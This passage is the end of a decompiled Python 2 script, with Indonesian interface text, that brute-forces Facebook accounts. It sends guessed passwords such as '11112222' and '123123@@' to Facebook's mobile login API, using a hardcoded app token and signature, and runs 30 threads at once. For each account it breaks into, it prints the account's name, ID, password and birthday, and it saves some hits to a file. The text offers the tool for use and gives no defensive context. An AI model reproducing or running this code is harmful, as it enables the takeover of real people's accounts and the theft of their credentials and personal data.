                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass9 + '\n'
                                                print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass9 + '\n'
                                                print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                cek = open('out/super_cp.txt', 'a')
                                                cek.write('ID:' + user + ' Pw:' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = '11112222'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                w = json.load(data)
                                                if 'access_token' in w:
                                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                    z = json.loads(x.text)
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass10 + '\n'
                                                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in w['error_msg']:
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass10 + '\n'
                                                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                    cek = open('out/super_cp.txt', 'a')
                                                    cek.write('ID:' + user + ' Pw:' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass11 = '123123@@'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    w = json.load(data)
                                                    if 'access_token' in w:
                                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                        z = json.loads(x.text)
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass11 + '\n'
                                                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in w['error_msg']:
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass11 + '\n'
                                                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                        cek = open('out/super_cp.txt', 'a')
                                                        cek.write('ID:' + user + ' Pw:' + pass11 + '\n')
                                                        cek.close()
                                                        cekpoint.append(user + pass11)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;34m'
    print '\x1b[1;97m[\x1b[1;93m\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;93m\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/ind1.txt'
    print '\x1b[1;34m'
    raw_input('\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
    os.system('python2 2910.py')


if __name__ == '__main__':
    menu()
    masuk()
# okay decompiling Bs4.pyc
